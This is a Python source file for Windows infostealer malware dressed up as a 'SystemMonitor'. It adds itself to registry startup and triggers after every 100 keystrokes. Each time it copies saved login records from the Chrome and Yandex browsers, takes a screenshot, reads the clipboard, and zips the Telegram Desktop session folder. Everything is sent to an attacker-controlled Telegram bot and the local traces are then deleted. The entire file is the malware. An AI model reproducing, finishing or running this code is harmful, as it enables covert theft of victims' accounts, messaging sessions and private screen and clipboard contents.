import os
import sys
import winreg
import sqlite3
import tempfile
import logging
import shutil
import zipfile
from pathlib import Path
from pynput import keyboard
from PIL import ImageGrab
import requests
from threading import Thread, Lock
import pyperclip
import time

# ========== Configuration ========== #
TELEGRAM_API_TOKEN = "API bot"
TELEGRAM_CHAT_ID = "Account ID"
KEYSTROKE_LIMIT = 100
BROWSER_PATHS = {
    'Chrome': {
        'history': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\History'),
        'logins': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data')
    },
    'Yandex': {
        'history': os.path.expandvars(r'%LOCALAPPDATA%\Yandex\YandexBrowser\User Data\Default\History'),
        'logins': os.path.expandvars(r'%LOCALAPPDATA%\Yandex\YandexBrowser\User Data\Default\Login Data')
    }
}
# ================================== #

logging.basicConfig(
    filename='MyAppPython.log',
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)

def add_to_startup():
    """Adding to startup via registry"""
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        exe_path = os.path.abspath(sys.argv[0])
        
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            key_path,
            0,
            winreg.KEY_SET_VALUE
        ) as key:
            winreg.SetValueEx(key, "MyAppPython", 0, winreg.REG_SZ, exe_path)
        logging.info("Added to startup registry")
    except Exception as e:
        logging.error(f"Startup error: {str(e)}")

class TelegramBot:
    def __init__(self):
        self.base_url = f"https://api.telegram.org/bot{TELEGRAM_API_TOKEN}/"
        
    def send_file(self, file_path, caption=""):
        """File sending with existence verification and retry attempts"""
        for attempt in range(3):
            try:
                if not os.path.exists(file_path):
                    raise FileNotFoundError(f"File {file_path} not found")
                
                url = f"{self.base_url}sendDocument"
                with open(file_path, 'rb') as file:
                    files = {'document': file}
                    data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
                    response = requests.post(url, files=files, data=data)
                    if response.status_code == 200:
                        logging.info(f"File {file_path} sent successfully")
                        return True
                    logging.warning(f"Attempt {attempt+1}: Failed to send {file_path}")
                time.sleep(2 ** attempt)
            except Exception as e:
                logging.error(f"File send error: {str(e)}")
                time.sleep(5)
        return False

class SystemMonitor:
    def __init__(self):
        self.keystroke_count = 0
        self.lock = Lock()
        self.bot = TelegramBot()
        add_to_startup()

    def on_press(self, key):
        """Key Press Handler"""
        with self.lock:
            self.keystroke_count += 1
            if self.keystroke_count >= KEYSTROKE_LIMIT:
                Thread(target=self.send_report).start()
                self.keystroke_count = 0

    def safe_remove(self, file_path, retries=10, delay=2):
        """Safe file deletion with retry attempts"""
        for _ in range(retries):
            try:
                if os.path.exists(file_path):
                    os.remove(file_path)
                    logging.info(f"File {file_path} removed")
                    return True
            except Exception as e:
                logging.warning(f"Cleanup retry {_+1}/{retries} for {file_path}: {str(e)}")
                time.sleep(delay)
        logging.error(f"Final cleanup failure for {file_path}")
        return False

    def get_browser_data(self):
        data = []
        for browser, paths in BROWSER_PATHS.items():
            try:
                with tempfile.TemporaryDirectory() as temp_dir:
                    if os.path.exists(paths['logins']):
                        logins_copy = os.path.join(temp_dir, 'Logins')
                        shutil.copy2(paths['logins'], logins_copy)
                        data.extend(self.read_logins_db(logins_copy, browser))
            except Exception as e:
                logging.error(f"{browser} error: {str(e)}")
        return data

    def read_logins_db(self, db_path, browser):
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            return [(browser, url, user, pwd) for url, user, pwd in cursor.fetchall()]
        except Exception as e:
            logging.error(f"Logins error: {str(e)}")
            return []
        finally:
            conn.close()

    def save_to_file(self, data, filename):
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                for browser, url, user, _ in data:
                    f.write(f"{browser}|{url}|{user}\n")
            return True
        except Exception as e:
            logging.error(f"Save error: {str(e)}")
            return False

    def take_screenshot(self, filename):
        try:
            ImageGrab.grab().save(filename)
            return True
        except Exception as e:
            logging.error(f"Screenshot error: {str(e)}")
            return False

    def get_clipboard(self):
        try:
            return pyperclip.paste()
        except Exception as e:
            logging.error(f"Clipboard error: {str(e)}")
            return ""

    def archive_tdata(self):
        try:
            tdata_path = os.path.expandvars(r'%APPDATA%\Telegram Desktop\tdata')
            if os.path.exists(tdata_path):
                zip_name = 'tdata.zip'
                with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    for root, _, files in os.walk(tdata_path):
                        for file in files:
                            full_path = os.path.join(root, file)
                            zipf.write(full_path, os.path.relpath(full_path, tdata_path))
                return zip_name
            return None
        except Exception as e:
            logging.error(f"Tdata archive error: {str(e)}")
            return None

    def create_data_archive(self):
        """Archive creation with file verification"""
        try:
            files_to_archive = ['creds.txt', 'screenshot.png', 'clipboard.txt']
            if all(os.path.exists(f) for f in files_to_archive):
                with zipfile.ZipFile('data.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
                    for file in files_to_archive:
                        zipf.write(file)
                return True
            logging.error("Missing files for data.zip")
            return False
        except Exception as e:
            logging.error(f"Archive error: {str(e)}")
            return False

    def cleanup_files(self, *filenames):
        """File cleanup with retry attempts"""
        for f in filenames:
            self.safe_remove(f)

    def send_report(self):
        """Enhanced report submission process"""
        files_to_cleanup = []
        try:
            data = self.get_browser_data()
            if not data:
                logging.info("No browser data found")
                return

            if not self.save_to_file(data, 'creds.txt'):
                return
            files_to_cleanup.append('creds.txt')

            if not self.take_screenshot('screenshot.png'):
                return
            files_to_cleanup.append('screenshot.png')

            clipboard_data = self.get_clipboard()
            with open('clipboard.txt', 'w') as f:
                f.write(clipboard_data)
            files_to_cleanup.append('clipboard.txt')

            if not self.create_data_archive():
                return
            files_to_cleanup.append('data.zip')

            if self.bot.send_file('screenshot.png', "SCREENSHOT"):
                self.cleanup_files('screenshot.png')
                
            if self.bot.send_file('data.zip', "FILES"):
                self.cleanup_files('data.zip')

            tdata_zip = self.archive_tdata()
            if tdata_zip and self.bot.send_file(tdata_zip, "tdata Telegram"):
                self.cleanup_files(tdata_zip)

        except Exception as e:
            logging.error(f"Report error: {str(e)}")
        finally:
            self.cleanup_files(*files_to_cleanup)
            if tdata_zip and os.path.exists(tdata_zip):
                self.cleanup_files(tdata_zip)

if __name__ == "__main__":
    monitor = SystemMonitor()
    listener = keyboard.Listener(on_press=monitor.on_press)
    listener.start()
    listener.join()